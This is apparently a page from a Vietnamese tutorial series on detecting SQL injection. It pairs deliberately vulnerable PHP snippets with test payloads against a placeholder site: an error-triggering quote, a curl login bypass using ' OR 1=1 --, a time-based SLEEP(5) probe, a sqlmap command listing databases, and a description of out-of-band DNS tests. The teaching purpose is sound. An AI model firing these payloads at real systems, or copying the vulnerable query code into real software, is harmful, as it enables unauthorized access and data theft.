# ***DETECT SQL INJECTION VULNERABILITIES***

## Làm như thế nào để phát hiện lỗ hổng SQL Injection?

Quá trình dò tìm SQLi thường bắt đầu bằng việc cố tình gửi các dữ liệu dị thường để xem ứng dụng xử lý chúng như thế nào. Dưới đây là 4 phương pháp kiểm thử thủ công phổ biến nhất:

- Nhập ký tự ***nháy đơn*** **'** hoặc ***nháy kép*** **"** : Đây là cách kiểm tra đơn giản nhất. **Dấu hiệu nhận biết:** Nếu trang web văng ra thông báo lỗi cơ sở dữ liệu (ví dụ: *You have an error in your SQL syntax...*) hoặc giao diện bị vỡ một cách bất thường $\rightarrow$ Khả năng cao có lỗi.
  > Ví dụ như cố tình chèn nháy đơn vào url `http://urldemo321.xyz/?id=123'`
  
  ``` php
  //Mã nguồn máy chủ:

  $id = $_GET['id'];
  // Lấy trực tiếp $id từ URL ghép vào chuỗi SQL
  $sql = "SELECT username, email FROM users WHERE id = '$id'"; // Dấu nháy đơn làm thay đổi cấu trúc SQL ở đây.
  $result = $conn->query($sql);

  if (!$result) {
    // Hiển thị trực tiếp lỗi của Database ra màn hình
    die("Lỗi truy vấn: " . $conn->error); 
  }
  ```

---

- Thử cú pháp SQL thay đổi giá trị.
- Thử điều kiện ***Boolean (Boolean-Based Blind SQLi)***
  -  Thường dùng để test form đăng nhập hoặc các chức năng tìm kiếm khi web che giấu thông báo lỗi. Ta tiêm các biểu thức luôn ĐÚNG (như OR 1=1) hoặc luôn SAI (như OR 1=2).
  - Dấu hiệu nhận biết: Quan sát sự khác biệt của giao diện ứng dụng giữa trường hợp truy vấn Đúng và Sai (ví dụ: 1=1 thì đăng nhập được, 1=2 thì báo sai mật khẩu).

  > Ví dụ như "http://urldemo321.xyz/login"
  
  ``` php
  //Mã nguồn máy chủ:

  $username = $_POST['username'];
  $password = $_POST['password'];

  $sql = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
  $result = $conn->query($sql);

  if ($result->num_rows > 0) {
    echo "Đăng nhập thành công!";
  } else {
    echo "Sai tài khoản hoặc mật khẩu.";
  }
  ```
  
  Cách thức thực hiện như sau:

  ``` powershell
  curl -X POST http://urldemo321.xyz/login --data-urlencode "username=administrator ' OR 1=1 --" -d "password=123456789" -v
  ```
  > **-X POST** : Đây là hành động gửi dữ liệu. (-d cũng ngầm hiểu là POST).
  >
  > **--data-urlencode** : Đảm bảo payload SQLi của bạn được gói gém cẩn thận, không bị vỡ định dạng khi đi qua môi trường mạng.
  >
  > **--** : Ký tự comment (tùy CSDL, có thể là # hoặc /*), dùng để vô hiệu hóa phần kiểm tra mật khẩu phía sau trong mã nguồn.
  >
  > **-v (Verbose)** : Hiện thị đầy đủ thông tin, dành cho debug.

---

- Thử độ trễ thời gian (**Time delays**): Nếu web không trả về lỗi hay thay đổi nội dung, bạn có thể gửi lệnh bắt cơ sở dữ liệu phải "tạm dừng" (ví dụ: chèn lệnh **WAITFOR DELAY '0:0:10'**). Nếu trang web **phản hồi chậm đi đúng 10 giây so với bình thường**, bạn có thể chắc chắn lỗ hổng tồn tại ***(Time-based Blind SQLi)***.
  > Ví dụ như "http://urldemo321.xyz/subscribers"

  ``` php
  // Mã nguồn máy

  $email = $_POST['email'];
  $sql = "SELECT * FROM subscribers WHERE email = '$email'";
  $conn->query($sql);

  // Bất kể email có trong CSDL hay không, web đều hiện một thông báo duy nhất
  echo "Yêu cầu của bạn đã được tiếp nhận.";
  ```

  Cách dễ nhất để kiểm thử như là:

  - Cách 1: dùng curl giống như trường hợp 2
  ``` powershell
  time curl -X POST [http://urldemo321.xyz/subscribers](http://urldemo321.xyz/subscribers) --data-urlencode "email=test@gmail.com' OR SLEEP(5) -- " -v
  ```

  - Cách 2: dùng sqlmap
  ``` bash
  sqlmap -u "http://urldemo321.xyz/subscribe" --data="email=test@gmail.com" --technique=T --dbs
  ```
  > (Cờ --technique=T chỉ định cho SQLMap biết: "Hãy chỉ dùng phương pháp Time-based (độ trễ thời gian) để tấn công trang web này").

---

- Thử OAST ***(Out-of-band Application Security Testing)***: Kỹ thuật này dùng cho các ***trường hợp đặc biệt "mù"*** (không báo lỗi, không đổi nội dung, không phản hồi chậm). Bạn chèn một đoạn mã ép cơ sở dữ liệu tự động tạo một kết nối mạng ra bên ngoài (ví dụ: truy vấn DNS đến một máy chủ do bạn kiểm soát). Nếu máy chủ của bạn nhận được tín hiệu kết nối, nghĩa là SQLi đã được thực thi thành công.

---

<p align="right" style="padding-top: 60px">
    <a href="./03-SQL_injection_in_different_parts_of_the_query.md">Bài tiếp theo: Tiêm mã vào các lệnh truy vấn SQL</a>
</p>